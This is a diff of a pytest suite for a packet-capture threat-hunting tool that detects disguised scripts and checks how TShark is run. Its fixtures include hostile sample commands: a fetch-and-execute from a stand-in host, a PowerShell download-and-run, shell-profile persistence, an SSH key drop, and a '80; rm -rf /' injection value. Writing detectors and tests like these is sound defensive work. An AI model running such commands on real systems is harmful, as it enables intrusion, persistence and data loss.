@@ -10,7 +10,13 @@ import httpx
 import pytest
 
 from romulus.config import Settings
-from romulus.detect.packets import DisguisedScriptOrExecutable, analyze_body, declared_document, show
+from romulus.detect.packets import (
+    DisguisedScriptOrExecutable,
+    analyze_body,
+    declared_document,
+    declared_media,
+    show,
+)
 from romulus.detect.registry import fresh_pack
 from romulus.evidence.typed import RawRef, TypedEvent, fv
 from romulus.hunt import packets as hp
@@ -56,6 +62,14 @@ RULE = "pcap.disguised_script_or_executable"
     (KEY_DROP, "script", "heuristic"),                                             # echo key >> authorized_keys
     (b"echo 'a > b' and \"c | sh\"\n", "text", None),                              # quoted > and | are text
     (b"echo hello 2>&1 >/dev/null\n", "text", None),                               # discarding output writes nothing
+    (b"/var/log/syslog\n/etc/passwd\n/etc/shadow\n", "text", None),                 # a list of paths
+    (b"./a/b.txt\n./a/c.txt\n", "text", None),                                      # find output
+    (b"grep error app.log > errors.txt\n", "text", None),                           # an ordinary redirect
+    (b"if [ -f big ]; then echo big > out; fi\n", "text", None),
+    (b'echo "a | sh\n', "text", None),                                             # an unclosed quote
+    (b"echo 'source /opt/env.sh' >> ~/.bashrc\n", "script", "heuristic"),          # profile persistence
+    (b"echo x > /tmp/.k\nchmod 700 /tmp/.k\n/tmp/.k\n", "script", "heuristic"),    # staged, then run
+    (b"cd /tmp\nwget http://e/x\nif [ -f x ]; then\n./x\nelse\nexit 1\nfi\n", "script", "heuristic"),
     ("\ufeffIEX (iwr http://e/a)\n".encode("utf-16"), "script", "heuristic"),     # UTF-16 PowerShell
     (b"# Project notes\n\nInstall the package, then run the tests.\n", "text", None),
     # hard benign: command lists that fetch, run, decode or persist nothing
@@ -86,6 +100,24 @@ def test_pipes_into_exec_and_redirects_to_files_are_execution_signals():
     assert drop.writes == ["/root/.ssh/authorized_keys"] and drop.commands == ["echo"]
     m = rule(body_event("k", KEY_DROP, url="http://h/README.txt.1", ctype="text/plain"))
     assert m and m[0].proposed_lane == "lead" and "redirects output to /root/.ssh/authorized_keys" in m[0].claim
+
+
+def test_heuristic_matches_carry_medium_confidence_and_the_full_time_range():
+    evs = [body_event(f"s{i}", SCRIPT, ts=T0 + timedelta(minutes=i)) for i in range(30)]
+    m = rule(*evs)[0]
+    assert m.confidence == "medium" and len(m.events) == 20
+    assert f"– {(T0 + timedelta(minutes=29)).isoformat()})" in m.claim       # the last of 30, not of 20 cited
+    assert rule(body_event("e", b"\x7fELF" + b"\x00" * 10))[0].confidence == "high"
+
+
+@pytest.mark.parametrize("path, encoding, expect", [
+    ("http://h/install.sh.gz", "gzip", False),          # decompressed by TShark: it is install.sh
+    ("http://h/busybox.gz", "gzip", False),
+    ("http://h/notes.txt.gz", "gzip", True),
+    ("http://h/install.sh.gz", None, True),             # no encoding: the body really was served as .gz
+])
+def test_compression_suffixes_follow_the_content_encoding(path, encoding, expect):
+    assert bool(declared_document(path, None, encoding) or declared_media(path, None, encoding)) is expect
 
 
 def test_cafebabe_is_labelled_honestly():
@@ -260,16 +292,26 @@ def test_tshark_runs_the_fixed_query_with_pinned_prefs_and_json_output(tmp_path,
                                            stderr=b"The file appears to have been cut short in the middle of a packet.")
 
     monkeypatch.setattr(pk.subprocess, "run", fake_run)
-    res = pk.run_tshark(Settings(home=tmp_path), cap, "http_responses", [tmp_path], http_ports=[8000, 80])
+    res = pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path], http_ports=[8000, 80])
     cmd, kw = calls[0]
-    assert "-c" not in cmd and cmd[cmd.index("-Y") + 1] == "http.response" and "-r" in cmd
+    assert "-c" not in cmd and cmd[cmd.index("-Y") + 1] == "http.request || http.response" and "-r" in cmd
     assert cmd[cmd.index("-T") + 1] == "json"
     assert all(p in cmd for p in pk.PINNED_PREFS) and cmd[cmd.index("tcp.desegment_tcp_streams:TRUE") - 1] == "-o"
     assert [cmd[i + 1] for i, a in enumerate(cmd) if a == "-d"] == ["tcp.port==80,http", "tcp.port==8000,http"]
     assert res.truncated and res.error is None
     assert res.rows[0]["frame.number"] == ["9"] and res.rows[0]["http.content_type"] == ["a\tb,c"]
     assert res.rows[0]["ip.src"] == []                         # every query field is present, possibly empty
-    assert (kw["preexec_fn"] is not None) == (os.name == "posix")
+    assert "preexec_fn" not in kw                              # limits come from prlimit, not a forked hook
+
+
+def test_tshark_limits_use_prlimit_where_it_exists(monkeypatch):
+    monkeypatch.setattr(pk.os, "name", "posix")
+    monkeypatch.setattr(pk.shutil, "which", lambda name: "/usr/bin/prlimit" if name == "prlimit" else None)
+    cmd = pk.limited(["tshark", "-r", "x"], 180)
+    assert cmd[:4] == ["/usr/bin/prlimit", f"--as={pk.TSHARK_MEMORY_BYTES}", "--cpu=185", "--"]
+    assert cmd[4:] == ["tshark", "-r", "x"]
+    monkeypatch.setattr(pk.shutil, "which", lambda name: None)
+    assert pk.limited(["tshark"], 180) == ["tshark"]
 
 
 @pytest.mark.parametrize("ports", [["80; rm -rf /"], [0], [70000], [True], [str(80)]])
@@ -277,14 +319,14 @@ def test_tshark_refuses_decode_ports_that_are_not_port_numbers(tmp_path, ports):
     cap = tmp_path / "a.pcap"
     cap.write_bytes(PCAP)
     with pytest.raises(pk.PacketError):
-        pk.run_tshark(Settings(home=tmp_path), cap, "http_responses", [tmp_path], http_ports=ports)
+        pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path], http_ports=ports)
 
 
 def test_tshark_invalid_output_is_an_error_not_an_empty_result(tmp_path, monkeypatch):
     cap = tmp_path / "a.pcap"
     cap.write_bytes(PCAP)
     monkeypatch.setattr(pk.subprocess, "run", lambda cmd, **kw: subprocess.CompletedProcess(cmd, 0, b"[{", b""))
-    assert pk.run_tshark(Settings(home=tmp_path), cap, "http_responses", [tmp_path]).error
+    assert pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path]).error
 
 
 def test_tshark_refuses_paths_outside_allowed_dirs(tmp_path):
@@ -293,7 +335,7 @@ def test_tshark_refuses_paths_outside_allowed_dirs(tmp_path):
     cap = other / "a.pcap"
     cap.write_bytes(PCAP)
     with pytest.raises(pk.PacketError):
-        pk.run_tshark(Settings(home=tmp_path), cap, "http_responses", [tmp_path / "allowed"])
+        pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path / "allowed"])
 
 
 def test_hex_body_hash_and_size_cover_the_whole_body_while_analysis_is_capped():
@@ -401,6 +443,33 @@ def test_stage_publishes_a_cited_finding_and_a_per_target_positive_only_cell(tmp
     assert not list((tmp_path / "stage").glob("romulus-pcap-*"))          # packets are removed after use
 
 
+def test_coverage_counts_pcap_cells_for_their_target_and_states_the_selection(tmp_path, monkeypatch):
+    from romulus.report import manifest as rm
+    engine = make_engine(":memory:")
+    migrate(engine)
+    repo = Repo(engine)
+    repo.create_hunt("h1", {}, "d", "t")
+    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
+    rows = [_row(50000 + i, T0.timestamp()) for i in range(3)]
+    monkeypatch.setattr(hp, "execute", lambda client, intent, contract: SearchOutcome(
+        target=intent.target, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.complete,
+        total=len(sessions) if intent.kind == "raw" else 7, total_relation="eq", returned=len(sessions),
+        records=sessions if intent.kind == "raw" else []))
+    monkeypatch.setattr(hp, "run_tshark", lambda s, pcap, query, dirs, http_ports=(): pk.TsharkResult(rows=rows))
+    host = contract_from_types("logs-lab", {"@timestamp": "date", "host.name": "keyword"})
+    window = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
+    hp.run_packet_stage(Settings(home=tmp_path), repo, None, "h1", window, {TARGET: _contract(), "logs-lab": host},
+                        packets=_Packets())
+    cells = [c for c in repo.rule_cells("h1") if c["rule_id"] == RULE]
+    assert {c["target"]: c["state"] for c in cells} == {f"arkime-pcap:{TARGET}": "matched",
+                                                         "logs-lab": "not_applicable_no_events"}
+    row = next(r for r in rm._coverage(repo.rule_cells("h1"), targets=[TARGET, "logs-lab"])["rules"]
+               if r["rule_id"] == RULE)
+    assert "no evaluation recorded" not in row["negative_claim"]
+    assert f"examined on {TARGET}: {hp.SELECTION_OVERLAP}" in row["negative_claim"]
+    assert "7 HTTP session(s) there had no body type" in row["negative_claim"]
+
+
 def test_candidate_selection_overlaps_the_window(tmp_path, monkeypatch):
     intents = []
     window = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
@@ -412,8 +481,15 @@ def test_candidate_selection_overlaps_the_window(tmp_path, monkeypatch):
 
 def test_without_last_packet_the_selection_falls_back_and_says_so(tmp_path, monkeypatch):
     contract = _contract(lastPacket="keyword")                     # present, but not range-searchable
-    _repo, summary = _stage(tmp_path, monkeypatch, contract=contract)
-    assert any("began before the window are not selected" in n for n in summary["notes"]), summary
+    repo, summary = _stage(tmp_path, monkeypatch, contract=contract)
+    assert summary["selection"][TARGET] == hp.SELECTION_WINDOW            # the text says what was actually used
+    assert _cell(repo)["detail"]["selection"] == hp.SELECTION_WINDOW
+    assert "not selected" in hp.SELECTION_WINDOW and "overlapping" not in hp.SELECTION_WINDOW
+
+
+def test_overlap_selection_is_named_in_the_cell(tmp_path, monkeypatch):
+    repo, summary = _stage(tmp_path, monkeypatch)
+    assert summary["selection"][TARGET] == hp.SELECTION_OVERLAP == _cell(repo)["detail"]["selection"]
 
 
 # B1: every way work can be lost is partial, in the cell and in the stage status, from one list of reasons
@@ -442,7 +518,7 @@ def test_candidate_cap_is_partial(tmp_path, monkeypatch):
     rows = [_row(1000 + i, T0.timestamp()) for i in range(hp.MAX_SESSIONS)]
     repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows, outcome=out)
     assert summary["candidates"] == hp.MAX_SESSIONS
-    _partial(repo, summary, f"first {hp.MAX_SESSIONS} of 900 sessions examined")
+    _partial(repo, summary, f"first {hp.MAX_SESSIONS} of 900 session documents examined")
 
 
 def test_failed_candidate_query_is_partial(tmp_path, monkeypatch):
@@ -455,8 +531,36 @@ def test_failed_candidate_query_is_partial(tmp_path, monkeypatch):
 def test_fetched_session_without_a_response_is_partial(tmp_path, monkeypatch):
     rows = [_row(50000 + i, T0.timestamp()) for i in range(2)]                  # the third session yields nothing
     repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
-    assert summary["sessions_without_responses"] == 1
-    _partial(repo, summary, "1 fetched session(s) had no HTTP response")
+    assert summary["sessions_without_messages"] == 1
+    _partial(repo, summary, "1 fetched session(s) had no HTTP message")
+
+
+def test_short_selection_below_the_cap_is_partial(tmp_path, monkeypatch):
+    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
+    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.partial,
+                        reasons=[f"cap:{hp.MAX_SESSIONS + 1}<total:400"], total=400, total_relation="eq",
+                        returned=3, records=sessions)
+    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, outcome=out)
+    _partial(repo, summary, "candidate selection partial: cap:")
+
+
+def test_short_selection_without_a_reason_is_still_partial(tmp_path, monkeypatch):
+    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
+    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.complete,
+                        total=5, total_relation="eq", returned=3, records=sessions)
+    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, outcome=out)
+    _partial(repo, summary, "returned 3 of 5 documents")
+
+
+def test_request_without_a_response_is_counted_not_partial(tmp_path, monkeypatch):
+    request = {"frame.number": ["3"], "frame.time_epoch": [str(T0.timestamp())],
+               "frame.protocols": ["eth:ethertype:ip:tcp:http"], "ip.src": ["172.17.100.121"],
+               "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
+               "http.request.method": ["POST"], "http.response.code": []}
+    rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
+    _repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
+    assert summary["sessions_request_only"] == 1 and summary["sessions_without_messages"] == 0
+    assert summary["status"] == "complete" and any("no response" in n for n in summary["notes"])
 
 
 def test_undecodable_body_is_partial(tmp_path, monkeypatch):
@@ -516,9 +620,32 @@ def test_same_tuple_sessions_are_told_apart_by_time(tmp_path, monkeypatch):
     assert by_time == {T0 - timedelta(minutes=45): early["_id"], T0 + timedelta(minutes=1): late["_id"]}
 
 
+def test_segments_of_one_session_are_one_session_and_cite_the_segment_holding_the_response(tmp_path, monkeypatch):
+    # Arkime saves a long session as segments that keep the original firstPacket
+    seg1 = _session("241118-SEG1AAAAAAAA", 50000, T0 - timedelta(minutes=30), T0 - timedelta(minutes=20))
+    seg2 = _session("241118-SEG2AAAAAAAA", 50000, T0 - timedelta(minutes=30), T0 + timedelta(minutes=10))
+    rows = [_row(50000, (T0 - timedelta(minutes=25)).timestamp()), _row(50000, (T0 + timedelta(minutes=5)).timestamp())]
+    repo, summary = _stage(tmp_path, monkeypatch, sessions=[seg2, seg1], rows=rows)
+    assert summary["status"] == "complete" and summary["ambiguous_responses"] == 0
+    assert summary["logical_sessions"] == 1 and summary["sessions_with_responses"] == 1 and summary["responses"] == 2
+    found = next(c for c in repo.candidates("h1") if c["rule_id"] == RULE)
+    events = [TypedEvent.model_validate(r["event"]) for r in repo.events_by_ids(found["event_ids"])]
+    assert {e.ts: e.get("arkime.session_id") for e in events} == {
+        T0 - timedelta(minutes=25): seg1["_id"], T0 + timedelta(minutes=5): seg2["_id"]}
+
+
+def test_segments_stay_in_one_batch():
+    lone = [_session(f"241118-LONE{i:08d}", 40000 + i) for i in range(15)]
+    segs = [_session(f"241118-SEGS{i:08d}", 50000, T0, T0 + timedelta(minutes=i)) for i in range(10)]
+    batches = hp._batches(lone + segs)
+    assert [len(b) for b in batches] == [15, 10]
+    big = [_session(f"241118-BIGS{i:08d}", 50000, T0, T0 + timedelta(minutes=i)) for i in range(45)]
+    assert [len(b) for b in hp._batches(big)] == [20, 20, 5]
+
+
 def test_overlapping_same_tuple_sessions_are_ambiguous_and_partial(tmp_path, monkeypatch):
-    a = _session("241118-AAAAAAAAAAAA", 50000)
-    b = _session("241118-BBBBBBBBBBBB", 50000)
+    a = _session("241118-AAAAAAAAAAAA", 50000, T0 - timedelta(minutes=10), T0 + timedelta(minutes=10))
+    b = _session("241118-BBBBBBBBBBBB", 50000, T0 - timedelta(minutes=5), T0 + timedelta(minutes=10))
     repo, summary = _stage(tmp_path, monkeypatch, sessions=[a, b], rows=[_row(50000, T0.timestamp())])
     assert summary["ambiguous_responses"] == 1
     _partial(repo, summary, "matched more than one session")
